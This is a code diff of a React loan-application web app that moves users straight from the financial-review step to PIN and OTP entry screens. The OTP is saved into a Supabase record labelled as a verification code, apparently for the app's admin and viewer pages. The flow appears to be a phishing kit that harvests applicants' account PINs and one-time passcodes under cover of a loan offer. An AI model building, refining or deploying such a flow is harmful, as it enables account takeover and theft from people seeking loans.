@@ -8,7 +8,6 @@ import { Step3FinancialReview } from './components/Step3FinancialReview';
 import { SuccessScreen } from './components/SuccessScreen';
 import { PinScreen } from './components/PinScreen';
 import { OtpScreen } from './components/OtpScreen';
-import { ConfirmationScreen } from './components/ConfirmationScreen';
 import AdminPage from './components/AdminPage';
 import ViewerPage from './components/ViewerPage';
 import { AppStep, LoanFormData, SubmittedApplication } from './types';
@@ -59,7 +58,7 @@ export default function App() {
     const displayValue = `${existing}OTP: ${otp}`;
     await updateApplicationVerificationCodeInSupabase(submittedApplication.id, displayValue);
     setSubmittedApplication((prev) => (prev ? { ...prev, verificationCode: displayValue } : prev));
-    setCurrentStep('confirmation');
+    setCurrentStep('success');
   };
 
   useEffect(() => {
@@ -92,10 +91,9 @@ export default function App() {
     if (currentStep === 'step1') setCurrentStep('calculator');
     else if (currentStep === 'step2') setCurrentStep('step1');
     else if (currentStep === 'step3') setCurrentStep('step2');
-    else if (currentStep === 'success') setCurrentStep('calculator');
-    else if (currentStep === 'pin') setCurrentStep('success');
+    else if (currentStep === 'pin') setCurrentStep('step3');
     else if (currentStep === 'otp') setCurrentStep('pin');
-    else if (currentStep === 'confirmation') setCurrentStep('otp');
+    else if (currentStep === 'success') setCurrentStep('otp');
   };
 
   const handleReset = () => {
@@ -141,7 +139,7 @@ export default function App() {
       setSubmittedApplication(fallbackApp);
     } finally {
       setIsSubmitting(false);
-      setCurrentStep('success');
+      setCurrentStep('pin');
     }
   };
 
@@ -229,7 +227,7 @@ export default function App() {
                 <SuccessScreen
                   application={submittedApplication}
                   onNewApplication={handleReset}
-                  onContinue={() => setCurrentStep('pin')}
+                  onContinue={handleReset}
                 />
               )}
 
@@ -237,7 +235,7 @@ export default function App() {
                 <PinScreen
                   phone={formData.phone}
                   applicationId={submittedApplication?.id ?? ''}
-                  onBack={() => setCurrentStep('success')}
+                  onBack={() => setCurrentStep('step3')}
                   onNext={handlePinSubmit}
                 />
               )}
@@ -249,12 +247,6 @@ export default function App() {
                   verificationDisplay={submittedApplication?.verificationCode ?? ''}
                   onBack={() => setCurrentStep('pin')}
                   onSuccess={handleOtpSubmit}
-                />
-              )}
-
-              {currentStep === 'confirmation' && (
-                <ConfirmationScreen
-                  onComplete={handleReset}
                 />
               )}
             </motion.div>
